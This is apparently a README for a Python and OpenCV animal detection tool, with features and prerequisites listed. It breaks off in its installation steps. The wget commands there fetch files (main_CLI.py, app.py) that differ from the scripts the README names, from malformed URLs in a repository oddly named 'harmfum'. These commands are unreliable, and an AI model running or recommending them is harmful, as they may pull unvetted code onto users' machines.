# Animal Detection System

AnimalDetectionSystem is a Python-based tool designed to detect animals in real-time using camera feeds or sensor data. This project leverages computer vision (via OpenCV) and optional hardware integration for applications like wildlife monitoring, farm security, or ecological research. It consists of two scripts: `index.py` for core detection logic and `createSession.py` for managing detection sessions (e.g., camera or sensor configurations). Developed for enthusiasts, researchers, and developers interested in automated animal detection.

## Features

- **Session Management** (`createSession.py`)
  - Initialize and manage detection sessions
  - Store session configurations (e.g., camera settings) in JSON files

- **Animal Detection** (`index.py`)
  - Detect animals in live camera feeds using OpenCV
  - Support for pre-trained models or custom detection algorithms
  - Log detection events with timestamps and details
  - Save detected animal images or video clips
  - Optional sensor integration (e.g., motion detection with PIR)

- **Additional Capabilities**
  - Automatic dependency installation
  - Detailed logging for debugging and tracking
  - Image processing with Pillow
  - Extensible for multi-camera or networked setups

## Prerequisites

- Python 3.8+
- Webcam or IP camera (for vision-based detection)
- Sensors like PIR or ultrasonic (optional, for motion-based detection)
- Internet connection (for initial setup)

## Installation

1. **Download the Files**
   Download the two core scripts from the repository:
   - [`index.py`](./index.py)
   - [`createSession.py`](./createSession.py)

   Command-line option:
   ```bash
   wget https://raw.githubusercontent.com/faraz_py/harmfum-animal-detection/main_CLI.py
   wget https://raw.githubusercontent.com/faraz_py/harmfum-animal-detection/app.py
